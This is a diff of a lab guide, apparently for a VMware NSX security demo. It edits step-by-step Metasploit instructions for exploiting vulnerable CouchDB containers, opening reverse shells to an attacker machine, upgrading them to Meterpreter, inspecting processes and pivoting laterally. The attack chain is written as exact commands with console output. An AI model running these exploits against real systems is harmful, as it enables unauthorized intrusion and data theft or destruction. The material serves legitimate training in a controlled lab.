@@ -571,7 +571,7 @@ msf5 exploit(unix/webapp/drupal_drupalgeddon2) > route add 192.168.20.0/24 1
 ```
 2.	Now that we have instructed Metapsloit to route traffic to the internal subnet through the reverse shell, we can pivot the attack and attack the **App1-APP-TIER VM** on the internal network, which is running a vulnerable **CouchDB** Service. 
 
-**Initiate CouchDB Commnad Execution attack against App1-APP-TIER VM**
+**Initiate CouchDB Command Execution attack against App1-APP-TIER VM**
 1.	Using the already open Metasploit console, follow the below steps to initiate the exploit. Hit **enter** between every step. 
     * Type **use exploit/linux/http/apache_couchdb_cmd_exec** to select the CouchDB Command Execution exploit module
     * Type **set RHOST 192.168.20.100** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-WEB-TIER VM**. (check the NSX VM Inventory to confirm)+
@@ -604,12 +604,15 @@ msf5 exploit(linux/http/apache_couchdb_cmd_exec) > exploit
 [*] Server stopped.
 ```
 3. You can now interact with the shell session or upgrade to a more powerful Meterpreter session. In order to upgrade to Meterpreter, you can run the below commands 
+    * Type **background** to move the shell session to the background. Confirm by entering **y**
     * Type **use multi/manage/shell_to_meterpreter** to select the CouchDB Command Execution exploit module
     * Type **set LPORT 8081** to define the local port to use. The reverse shell will be established to this local port
     * Type **set session 2** to indicate the reverse command shell session from **App1-WEB-APP VM** is the one we want to upgrade
     * Type **exploit** to establish the session
 
 ```console
+background
+Background session 2? [y/N]  y
 msf5 exploit(linux/http/apache_couchdb_cmd_exec) > use multi/manage/shell_to_meterpreter
 msf5 post(multi/manage/shell_to_meterpreter) > set LPORT 8081
 LPORT => 8081
@@ -627,9 +630,7 @@ msf5 post(multi/manage/shell_to_meterpreter) > exploit
 [*] Command stager progress: 100.00% (773/773 bytes)
 [*] Post module execution completed
 ```
-    * Type **use multi/manage/shell_to_meterpreter** to sele
-
-6. **Optionally**, you can now interact with the Meterpreter session. For instance, you can run the below commands to gain more inforation on the exploited **App1-WEB-TIER VM**
+5. You can now interact with the Meterpreter session. For instance, you can run the below commands to gain more inforation on the exploited **App1-APP-TIER VM**
     * Type **sessions -l** to see all established sessions
 ```console
 msf5 post(multi/manage/shell_to_meterpreter) > sessions -l
@@ -643,15 +644,59 @@ Active sessions
   2         shell x64/linux                                                                            10.114.209.151:4445 -> 10.114.209.148:50665 (192.168.20.100)
   3         meterpreter x86/linux  no-user @ fd5e509d541b (uid=0, gid=0, euid=0, egid=0) @ 172.19.0.2  10.114.209.151:8081 -> 10.114.209.148:59526 (172.19.0.2)
 ```
-   * Type **sessions -1 3** to interact with the newly established **Meterpreter** session
+> **Note**: the external IP address (10.114.209.148) the above example for sessions 2 and 3 is the NATted IP address **App1-APP-TIER VM** to establish the reverse shell. NAT was pre-configured during the automated lab deployment.
+
+   * Type **sessions -i 3** to interact with the newly established **Meterpreter** session
+   * You can now run commands as in the previous exercise but gain more information about the **App1-APP-TIER VM**, retrieve or destroy data. Below is an example
 
 ```console
-meterpreter > sysinfo
-Computer    : 273e1700c5be
-OS          : Linux 273e1700c5be 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64
-Meterpreter : php/linux
-meterpreter > ?
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name          Arch    User  Path
+ ---   ----  ----          ----    ----  ----
+ 1     0     beam.smp      x86_64  root  /opt/couchdb/erts-6.2/bin
+ 36    1     sh            x86_64  root  /bin
+ 37    1     memsup        x86_64  root  /opt/couchdb/lib/os_mon-2.3/priv/bin
+ 38    1     cpu_sup       x86_64  root  /opt/couchdb/lib/os_mon-2.3/priv/bin
+ 40    1     inet_gethost  x86_64  root  /opt/couchdb/erts-6.2/bin
+ 41    40    inet_gethost  x86_64  root  /opt/couchdb/erts-6.2/bin
+ 42    1     couchjs       x86_64  root  /opt/couchdb/bin
+ 45    1     sh            x86_64  root  /bin
+ 48    45    sh            x86_64  root  /bin
+ 1392  1     sh            x86_64  root  /bin
+ 1395  1392  sh            x86_64  root  /bin
+ 1552  1395  woPDm         x86_64  root  /tmp
+ 1559  1     sh            x86_64  root  /bin
+ 1562  1559  sh            x86_64  root  /bin
+ 1754  1562  Qkchu         x86_64  root  /tmp
+ 1760  0     bash          x86_64  root  /bin
 ```
+> **Note**: The VMs deployed in this lab run Drupal and CouchCB services as containers (built using Vulhub). The establshed session puts you into the container **cve201712635_couchdb_1** container shell.
+
+6.	Now we can pivot the attack and laterally move to other application VM deployed in the same network segment as **App1-APP-TIER VM**. We will will use the same **apache_couchdb_cmd_exec** exploit to  the **App2-APP-TIER VM** on the internal network, which also is running a vulnerable **CouchDB** Service. 
+
+**Initiate CouchDB Command Execution attack against App2-APP-TIER VM**
+1.	Using the already open Metasploit console, follow the below steps to initiate the exploit. Hit **enter** between every step. 
+    * Type **use exploit/linux/http/apache_couchdb_cmd_exec** to select the CouchDB Command Execution exploit module
+    * Type **set RHOST 192.168.20.100** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-WEB-TIER VM**. (check the NSX VM Inventory to confirm)+
+    * Type **set LHOST 10.114.209.151* to define the IP address of the local attacker machine. The IP address should match the IP address of **EXTERNAL VM**. (This IP will be different in your environment !. You can run **ifconfig** to determine this IP)
+    * Type **set LPORT 4445** to define the local port to use. The reverse shell will be established to this local port
+    * Type **exploit** to initiate the exploit and esbalish a command shell
+```console
+msf5 exploit(unix/webapp/drupal_drupalgeddon2) > use exploit/linux/http/apache_couchdb_cmd_exec
+[*] Using configured payload linux/x64/shell_reverse_tcp
+msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set RHOST 192.168.20.100
+RHOST => 192.168.20.100
+msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set LHOST 10.114.209.151
+LHOST => 10.114.209.151
+msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set LPORT 4445
+LPORT => 4445
+msf5 exploit(linux/http/apache_couchdb_cmd_exec) > exploit
+```
+
 
 
 
